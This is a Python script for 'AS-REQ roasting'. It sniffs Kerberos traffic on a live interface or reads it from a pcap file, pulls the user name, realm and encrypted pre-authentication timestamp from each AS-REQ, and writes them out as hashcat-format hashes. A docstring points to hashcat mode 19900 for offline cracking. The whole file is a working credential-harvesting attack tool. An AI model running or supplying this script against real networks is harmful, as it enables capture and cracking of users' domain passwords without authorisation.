#!/usr/bin/env python3

import argparse
import pyshark

def parse_asreq_packet(packet):
    if not hasattr(packet, 'kerberos'):
        return

    krb = packet.kerberos
    msg_type = krb.msg_type

    # asreq = 10
    if msg_type != '10':
        return

    padata_types = []
    if hasattr(krb, 'padata_type'):
        if isinstance(krb.padata_type, list):
            padata_types = [ptype.show for ptype in krb.padata_type]
        else:
            padata_types = [krb.padata_type.show]

    if any(ptype == '2' for ptype in padata_types):
        username = krb.cnamestring if hasattr(krb, 'cnamestring') else None
        realm = krb.realm if hasattr(krb, 'realm') else None
        etype = krb.etype if hasattr(krb, 'etype') else None
        ciphertext = krb.cipher if hasattr(krb, 'cipher') else None

        print("[+] Found AS-REQ with pA-ENC-TIMESTAMP")
        print(f"    User (cname): {username}")
        print(f"    Realm:        {realm}")
        print(f"    EType:        {etype}")
        print(f"    CipherText:   {ciphertext}")
        print()
        
        # https://hashcat.net/wiki/doku.php?id=example_hashes
        fmt = f"$krb5pa$18${username}${realm}${''.join(ciphertext.split(':'))}"
        print("=========================")
        print(fmt)
        with open(f"{username}@{realm}-{''.join(ciphertext.split(':'))[:6]}.krb5pa", 'w') as f:
            f.write(fmt)
        print(f"=> {username}@{realm}-{''.join(ciphertext.split(':'))[:6]}.krb5pa")
        print("=========================")

def capture_kerberos_tickets_from_file(filename):
    print(f"[*] Reading Kerberos packets from file: {filename}")
    cap = pyshark.FileCapture(filename, display_filter='kerberos')
    for packet in cap:
        parse_asreq_packet(packet)
    cap.close()

def capture_kerberos_tickets_live(interface):
    print(f"[*] Starting live capture on interface: {interface}")
    cap = pyshark.LiveCapture(interface=interface, display_filter='kerberos')

    try:
        for packet in cap.sniff_continuously():
            parse_asreq_packet(packet)
    except KeyboardInterrupt:
        print("[*] Stopped live capture.")
    finally:
        cap.close()

def main():
    """
    hashcat -m 19900 ...
    """

    parser = argparse.ArgumentParser(description="Capture and process Kerberos AS-REQ (Pre-Auth) packets for AS-REQ roasting.")
    subparsers = parser.add_subparsers(dest='command', help='Subcommand to run')

    file_parser = subparsers.add_parser('file', help='Capture kerberos packets from a file')
    file_parser.add_argument('filename', help='The path to the pcap file')

    live_parser = subparsers.add_parser('live', help='Capture kerberos packets live from an interface')
    live_parser.add_argument('interface', help='Network interface for live capture')

    args = parser.parse_args()

    if args.command == 'file':
        capture_kerberos_tickets_from_file(args.filename)
    elif args.command == 'live':
        capture_kerberos_tickets_live(args.interface)
    else:
        parser.print_help()

if __name__ == '__main__':
    main()
